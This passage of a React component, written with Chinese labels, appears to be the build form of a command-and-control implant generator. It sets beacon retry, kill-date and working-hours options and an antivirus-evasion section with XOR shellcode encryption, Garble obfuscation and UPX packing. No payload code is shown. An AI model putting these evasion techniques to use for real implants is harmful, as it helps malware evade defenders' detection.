                      name="retry_wait"
                      value={formData.retry_wait}
                      onChange={handleInputChange}
                      min={1}
                      max={60}
                    />
                  </div>
                </div>
                <div className="form-row">
                  <div className="form-group">
                    <label>终止日期 (可选)</label>
                    <input
                      type="date"
                      name="kill_date"
                      value={formData.kill_date}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="form-group">
                    <label>工作时间 (可选)</label>
                    <input
                      type="text"
                      name="working_hours"
                      value={formData.working_hours}
                      onChange={handleInputChange}
                      placeholder="09:00-18:00"
                    />
                  </div>
                </div>
              </div>

              <div className="form-section evasion-section">
                <h4><Shield size={16} /> 免杀选项 🔰</h4>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label">
                      <input
                        type="checkbox"
                        name="xor_encrypt"
                        checked={formData.xor_encrypt || false}
                        onChange={handleInputChange}
                      />
                      <span>XOR Shellcode 加密</span>
                    </label>
                    <p className="form-hint">对生成的 shellcode 使用随机 XOR 密钥加密</p>
                  </div>

                  {formData.xor_encrypt && (
                    <div className="form-group" style={{ marginTop: '8px' }}>
                      <label>XOR 密钥长度</label>
                      <select name="xor_key_size" value={formData.xor_key_size || 16} onChange={handleInputChange}>
                        <option value={8}>8 字节</option>
                        <option value={16}>16 字节</option>
                        <option value={32}>32 字节</option>
                      </select>
                    </div>
                  )}
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className={`toggle-label ${!builderInfo?.evasion?.garble_available ? 'toggle-disabled' : ''}`}>
                      <input
                        type="checkbox"
                        name="garble_enabled"
                        checked={(formData.garble_enabled || false) && (builderInfo?.evasion?.garble_available || false)}
                        onChange={handleInputChange}
                        disabled={!builderInfo?.evasion?.garble_available}
                      />
                      <span>Garble 混淆</span>
                      {builderInfo?.evasion?.garble_available ? (
                        <span className="status-badge available">可用</span>
                      ) : (
                        <span className="status-badge unavailable">未安装</span>
                      )}
                    </label>
                    <p className="form-hint">
                      {builderInfo?.evasion?.garble_available
                        ? '编译时混淆字符串、移除调试信息'
                        : 'Garble 混淆需要安装 garble (go install mvdan.cc/garble@latest)'}
                    </p>
                  </div>
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className={`toggle-label ${!builderInfo?.evasion?.upx_available ? 'toggle-disabled' : ''}`}>
                      <input
                        type="checkbox"
                        name="upx_enabled"
                        checked={(formData.upx_enabled || false) && (builderInfo?.evasion?.upx_available || false)}
                        onChange={handleInputChange}
                        disabled={!builderInfo?.evasion?.upx_available}
                      />
                      <span>UPX 压缩</span>
                      {builderInfo?.evasion?.upx_available ? (
                        <span className="status-badge available">可用</span>
                      ) : (
                        <span className="status-badge unavailable">未安装</span>
                      )}
                    </label>
                    <p className="form-hint">
                      {builderInfo?.evasion?.upx_available
                        ? '使用 UPX --best --lzma 压缩可执行文件 (仅Windows)'
                        : 'UPX 需要安装 (https://upx.github.io)'}
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div className="modal-footer">
              <button className="btn btn-secondary" onClick={() => setShowModal(false)}>
                取消
              </button>
              <button className="btn btn-primary" onClick={handleBuild} disabled={building}>
                {building ? (
                  <>
                    <Loader2 size={16} className="spinning" />
                    <span>构建中...</span>
                  </>
                ) : (
                  '构建'
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
